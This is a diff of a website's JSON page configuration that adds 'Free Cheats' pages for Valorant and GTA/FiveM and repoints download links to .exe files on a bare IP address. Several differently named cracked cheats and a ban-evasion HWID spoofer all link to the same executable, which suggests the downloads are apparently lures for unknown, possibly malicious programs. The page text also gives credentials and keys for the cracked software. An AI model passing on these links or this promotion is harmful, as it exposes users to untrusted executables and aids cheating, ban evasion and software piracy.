@@ -250,6 +250,64 @@
             }
         },
         {
+            "name": "LinkListFreeScriptsBanner",
+            "props": {
+                "headline": "",
+                "faq_list": []
+            },
+            "props_config": {
+                "headline": {
+                    "label": "Überschrift",
+                    "type": "text"
+                },
+                "faq_list": {
+                    "label": "FAQ Liste",
+                    "type": "array",
+                    "data": [
+                        {
+                            "question": {
+                                "label": "Frage",
+                                "type": "text"
+                            },
+                            "answer": {
+                                "label": "ANTWORT AUF DIE GESTELLTE FRAGE HIER",
+                                "type": "textarea"
+                            }
+                        }
+                    ]
+                }
+            }
+        },
+        {
+            "name": "MainsiteBanner",
+            "props": {
+                "headline": "",
+                "faq_list": []
+            },
+            "props_config": {
+                "headline": {
+                    "label": "Überschrift",
+                    "type": "text"
+                },
+                "faq_list": {
+                    "label": "FAQ Liste",
+                    "type": "array",
+                    "data": [
+                        {
+                            "question": {
+                                "label": "Frage",
+                                "type": "text"
+                            },
+                            "answer": {
+                                "label": "ANTWORT AUF DIE GESTELLTE FRAGE HIER",
+                                "type": "textarea"
+                            }
+                        }
+                    ]
+                }
+            }
+        },
+        {
             "name": "LinkListKontakt",
             "props": {
                 "headline": "",
@@ -740,6 +798,17 @@
                 }
             ],
             "components": [
+                {
+                    "name": "MainsiteBanner",
+                    "props": {
+                        "image1": "https://i.imgur.com/wARrWxB.png",
+                        "link1": "/free-cheats",
+                        "headline": "Free Cheats",
+                        "headline_variant": "p",
+                        "text": ""
+                    }
+
+                },
                 {
                     "name": "ContentRightNoButton",
                     "props": {
@@ -2816,21 +2885,11 @@
             "components": []
         },
         {
-            "title": "Free Cheats",
-            "page_title": "Free Cheats",
-            "is_in_nav": true,
-            "href": "/free-cheats",
+            "title": "Free Cheats GTA",
+            "page_title": "Free Cheats GTA",
+            "is_in_nav": false,
+            "href": "/free-cheats-gta",
             "children": [
-                {
-                    "title": "FiveM Spoofer",
-                    "name": "FiveM Spoofer",
-                    "href": "https://download2275.mediafire.com/f1bu7z353v1g/hzak0vqs4ofw6t5/FiveM-Spoofer.exe"
-                },
-                {
-                    "title": "Valo Hack",
-                    "name": "Valo Hack",
-                    "href": "https://download1481.mediafire.com/nkp5k2e2wvjg/mfdd135ezuut74u/Valorant-Hack.exe"
-                }
             ],
             "meta": [
                 {
@@ -2988,14 +3047,224 @@
                 {
                     "name": "LinkListFreeScriptsRight",
                     "props": {
+                        "image": "https://i.imgur.com/EGZ5HQv.png",
+                        "headline": "Grand 5 RP Cheat / 0xCheats Crack X MAYBE WONT WORK X",
+                        "headline_variant": "p",
+                        "text": "This is the ONLY Crack of 0xCheats Grand RP Existing out there, if you want to be one of the only Cheaters on Grand RP go get it as long as its working.",
+                        "downloadlink": "http://37.228.132.123/Files/LAUNCHER/GrandRPCheat.exe"
+                    }
+
+                },
+                {
+                    "name": "LinkListFreeScriptsLeft",
+                    "props": {
                         "image": "https://i.imgur.com/7afkiP3.png",
                         "headline": "FiveM Global HWID Spoofer",
                         "headline_variant": "p",
                         "text": "This Spoofer is used to avoid a Global HWID Ban, just run the File, Choose your Option and run the Game again with a new Rockstar, Steam and Discord Account & no Microsoft / XBOX Account Linked!",
-                        "downloadlink": "https://download2275.mediafire.com/f1bu7z353v1g/hzak0vqs4ofw6t5/FiveM-Spoofer.exe"
+                        "downloadlink": "http://37.228.132.123/Files/LAUNCHER/LuaExecutorCrack.exe"
                     }
 
                 },
+                {
+                    "name": "LinkListFreeScriptsRight",
+                    "props": {
+                        "image": "https://i.imgur.com/BTm5V5s.png",
+                        "headline": "Kek Hack Premium Cracked X MAYBE WONT WORK X",
+                        "headline_variant": "p",
+                        "text": "This FiveM Cheat is made by kekhack.com and got cracked by EulenDecrypter, credits to him for this Awesome crack! Just Enter Admin as username and eulendecrypter as password when you login.",
+                        "downloadlink": "http://37.228.132.123/Files/LAUNCHER/LuaExecutorCrack.exe"
+                    }
+
+                },
+                {
+                    "name": "LinkListFreeScriptsLeft",
+                    "props": {
+                        "image": "https://i.imgur.com/mnehrID.png",
+                        "headline": "Red Engine Crack X MAYBE WONT WORK X",
+                        "headline_variant": "p",
+                        "text": "We give out Free Access to the Red Engine Software wich is used to edit Source in the FiveM Launcher.",
+                        "downloadlink": "http://37.228.132.123/Files/LAUNCHER/LuaExecutorCrack.exe"
+                    }
+
+                },
+                {
+                    "name": "LinkListFreeScriptsRight",
+                    "props": {
+                        "image": "https://i.imgur.com/J7RI9uK.png",
+                        "headline": "Eulen Crack X MAYBE WONT WORK X",
+                        "headline_variant": "p",
+                        "text": "This is the Most Popular FiveM Cheat out there, you can use it for free with the key consoleservices if the Programm starts for you.",
+                        "downloadlink": "http://37.228.132.123/Files/LAUNCHER/LuaExecutorCrack.exe"
+                    }
+
+                },
+                {
+                    "name": "Footer"
+                }
+            ]
+        },
+        {
+            "title": "Free Cheats Valorant",
+            "page_title": "Free Cheats Valorant",
+            "is_in_nav": false,
+            "href": "/free-cheats-valorant",
+            "children": [
+    
+            ],
+            "meta": [
+                {
+                    "meta_tag": "description",
+                    "label": "Meta Beschreibung",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "viewport",
+                    "label": "Viewport Beschreibung",
+                    "content": "width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=2.0",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "charset",
+                    "label": "Meta Charset",
+                    "content": "UTF-8",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "keywords",
+                    "label": "Meta Keywords",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "robots",
+                    "label": "Robots",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "canonical",
+                    "label": "Meta Canonical",
+                    "content": "",
+                    "type": "rel"
+                },
+                {
+                    "meta_tag": "revisit-after",
+                    "label": "Meta Revisit",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "language",
+                    "label": "Meta Language",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "author",
+                    "label": "Meta Author",
+                    "content": "Ambitive Härdrich & Meister GbR",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "og:updated_time",
+                    "label": "Meta OG Updated Time",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:locale",
+                    "label": "Meta OG Local",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:type",
+                    "label": "Meta OG Type",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:url",
+                    "label": "Meta OG URL",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:site_name",
+                    "label": "Meta OG Site Name",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:title",
+                    "label": "Meta OG Title",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:description",
+                    "label": "Meta OG Description",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "twitter:card",
+                    "label": "Meta Twitter Card",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "twitter:title",
+                    "label": "Meta Twitter Title",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "twitter:description",
+                    "label": "Meta Twitter Description",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "google-site-verification",
+                    "label": "Meta Google Site Verification",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "facebook-domain-verification",
+                    "label": "Meta Facebook Site Verification",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "dcterms.creator",
+                    "label": "Meta DC Terms Creator",
+                    "content": "Ambitive Härdrich & Meister GbR",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "dcterms.rightsHolder",
+                    "label": "Meta Rights Holder",
+                    "content": "Ambitive Härdrich & Meister GbR",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "dcterms.rights",
+                    "label": "Meta DC Terms Rights",
+                    "content": "Ambitive Härdrich & Meister GbR",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "dcterms.dateCopyrighted",
+                    "label": "Meta DC Terms Date Copyrighted",
+                    "content": "2021",
+                    "type": "name"
+                }
+            ],
+            "components": [
                 {
                     "name": "LinkListFreeScriptsLeft",
                     "props": {
@@ -3003,7 +3272,207 @@
                         "headline": "Valorant ESP & Memory Aimbot",
                         "headline_variant": "p",
                         "text": "This is and almost undetected Valorant cheats including ESP & Memory Aimbot, we dont recommend using this Cheat on your Main Account.",
-                        "downloadlink": "https://download1481.mediafire.com/nkp5k2e2wvjg/mfdd135ezuut74u/Valorant-Hack.exe"
+                        "downloadlink": "http://37.228.132.123/Files/LAUNCHER/UniversalCheat.exe"
+                    }
+
+                },
+                {
+                    "name": "LinkListFreeScriptsRight",
+                    "props": {
+                        "image": "https://i.imgur.com/UGusGL7.png",
+                        "headline": "Valorant ESP ONLY",
+                        "headline_variant": "p",
+                        "text": "This is an very undetected Valorant ESP working only over the Step Sound Execution, not over the Actual Players hitbox, thats what is making it that undetected.",
+                        "downloadlink": "http://37.228.132.123/Files/LAUNCHER/UniversalCheat.exe"
+                    }
+
+                },
+                {
+                    "name": "Footer"
+                }
+            ]
+        },
+        {
+            "title": "Free Cheats",
+            "page_title": "Free Cheats",
+            "is_in_nav": true,
+            "href": "/free-cheats",
+            "children": [
+                {
+                    "title": "Valorant",
+                    "name": "Valorant",
+                    "href": "/free-cheats-valorant"
+                },
+                {
+                    "title": "GTA V / FiveM / Grand5RP",
+                    "name": "GTA V / FiveM / Grand5RP",
+                    "href": "/free-cheats-gta"
+                }
+    
+            ],
+            "meta": [
+                {
+                    "meta_tag": "description",
+                    "label": "Meta Beschreibung",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "viewport",
+                    "label": "Viewport Beschreibung",
+                    "content": "width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=2.0",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "charset",
+                    "label": "Meta Charset",
+                    "content": "UTF-8",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "keywords",
+                    "label": "Meta Keywords",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "robots",
+                    "label": "Robots",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "canonical",
+                    "label": "Meta Canonical",
+                    "content": "",
+                    "type": "rel"
+                },
+                {
+                    "meta_tag": "revisit-after",
+                    "label": "Meta Revisit",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "language",
+                    "label": "Meta Language",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "author",
+                    "label": "Meta Author",
+                    "content": "Ambitive Härdrich & Meister GbR",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "og:updated_time",
+                    "label": "Meta OG Updated Time",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:locale",
+                    "label": "Meta OG Local",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:type",
+                    "label": "Meta OG Type",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:url",
+                    "label": "Meta OG URL",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:site_name",
+                    "label": "Meta OG Site Name",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:title",
+                    "label": "Meta OG Title",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "og:description",
+                    "label": "Meta OG Description",
+                    "content": "",
+                    "type": "property"
+                },
+                {
+                    "meta_tag": "twitter:card",
+                    "label": "Meta Twitter Card",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "twitter:title",
+                    "label": "Meta Twitter Title",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "twitter:description",
+                    "label": "Meta Twitter Description",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "google-site-verification",
+                    "label": "Meta Google Site Verification",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "facebook-domain-verification",
+                    "label": "Meta Facebook Site Verification",
+                    "content": "",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "dcterms.creator",
+                    "label": "Meta DC Terms Creator",
+                    "content": "Ambitive Härdrich & Meister GbR",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "dcterms.rightsHolder",
+                    "label": "Meta Rights Holder",
+                    "content": "Ambitive Härdrich & Meister GbR",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "dcterms.rights",
+                    "label": "Meta DC Terms Rights",
+                    "content": "Ambitive Härdrich & Meister GbR",
+                    "type": "name"
+                },
+                {
+                    "meta_tag": "dcterms.dateCopyrighted",
+                    "label": "Meta DC Terms Date Copyrighted",
+                    "content": "2021",
+                    "type": "name"
+                }
+            ],
+            "components": [
+                {
+                    "name": "LinkListFreeScriptsBanner",
+                    "props": {
+                        "image2": "https://i.imgur.com/BbYe3rO.png",
+                        "image1": "https://i.imgur.com/4fsot6H.png",
+                        "link2": "/free-cheats-gta",
+                        "link1": "/free-cheats-valorant",
+                        "headline": "Free Cheats",
+                        "headline_variant": "p",
+                        "text": ""
                     }
 
                 },
